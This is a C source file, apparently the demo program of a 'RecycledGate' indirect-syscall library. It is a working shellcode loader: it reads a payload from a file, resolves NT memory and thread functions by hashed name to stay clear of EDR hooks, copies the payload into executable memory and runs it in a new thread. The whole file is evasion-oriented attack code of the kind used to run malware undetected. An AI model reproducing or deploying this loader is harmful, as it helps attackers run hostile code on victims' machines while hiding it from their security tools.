#include "windows.h"

#include "Defines.h"
#include "../src/RecycledGate.h"

#include "stdio.h"

extern void PrepareSyscall(DWORD dwSycallNr, PVOID dw64Gate);
extern DoSyscall();

PVOID findNtDll(void);
DWORD getSyscall(DWORD crypted_hash, Syscall* pSyscall);

int main(int argc, char* argv[]) {


	DWORD dwSuccess = FAIL, dwRead = 0;
	NTSTATUS ntStatus = 0;
	LPVOID pRemoteCode = NULL;
	HANDLE hThread = NULL;

	HANDLE hproc = GetCurrentProcess();
	Syscall sysNtAllocateVirtualMemory = { 0x00 }, sysNtWriteVirtualMemory = { 0x00 }, sysNtCreateThreadEx = { 0x00 }, sysNtWaitForSingleObject = { 0x00 };

	LPVOID payload = NULL;
	HANDLE hFile = NULL;
	SIZE_T payload_len = 0;
	hFile = CreateFileA(argv[1], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("[-] Failed to open: %s\n", argv[1]);
		return -1;
	}

	payload_len = GetFileSize(hFile, NULL);
	if (payload_len == 0) {
		printf("[-] File is empty?\n");
		return -1;
	}

	payload = VirtualAlloc(0, payload_len, MEM_COMMIT, PAGE_READWRITE);
	if (payload == NULL) {
		printf("Out of memory o.0\n");
		return -1;
	}

	dwSuccess = ReadFile(hFile, payload, (DWORD)payload_len, &dwRead, NULL);
	if (dwSuccess == 0) {
		printf("[*] Failed to read\n");
		return -1;
	}

	printf("\n%d\n", payload_len);
	dwSuccess = getSyscall(0x26d18008, &sysNtAllocateVirtualMemory);
	if (dwSuccess == FAIL) {
		printf("Failed to get syscall for NtAllocateVirtualMemory");
		return -1;
	}
		

	dwSuccess = getSyscall(0xd4b1e4d6, &sysNtWriteVirtualMemory);
	if (dwSuccess == FAIL) {
		printf("Failed to get syscall for NtWriteVirtualMemory");
		return -1;
	}
		

	dwSuccess = getSyscall(0x8a4e6274, &sysNtCreateThreadEx);
	if (dwSuccess == FAIL) {
		printf("Failed to get syscall for NtCreateThreadEx");
		return -1;
	}
		

	dwSuccess = getSyscall(0xd2f8578, &sysNtWaitForSingleObject);
	if (dwSuccess == FAIL) {
		printf("Failed to get syscall for NtWaitForSingleObject");
		return -1;
	}
		
	

	PrepareSyscall(sysNtAllocateVirtualMemory.dwSyscallNr, sysNtAllocateVirtualMemory.pRecycledGate);
	ntStatus = DoSyscall(hproc, &pRemoteCode, 0, (PULONG)&payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!NT_SUCCESS(ntStatus)) {
		printf("[-] Failed to allocate memory\n");
		return -1;
	}
	printf("[*] Allocated Virtual Memory\n");

	PrepareSyscall(sysNtWriteVirtualMemory.dwSyscallNr, sysNtWriteVirtualMemory.pRecycledGate);
	ntStatus = DoSyscall(hproc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T*)NULL);
	if (!NT_SUCCESS(ntStatus)) {
		printf("[-] Failed write memory %x\n",ntStatus);
		return -1;
	}
	printf("[*] Wrote Virtual Memory\n");

	PrepareSyscall(sysNtCreateThreadEx.dwSyscallNr, sysNtCreateThreadEx.pRecycledGate);
	ntStatus = DoSyscall(&hThread, GENERIC_ALL, NULL, hproc, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, NULL, NULL, NULL, NULL, NULL);
	if (!NT_SUCCESS(ntStatus)) {
		printf("[-] Failed to create thread\n");
		return -1;
	}
	printf("[*] Created Thread\n");

	Sleep(50000);


}

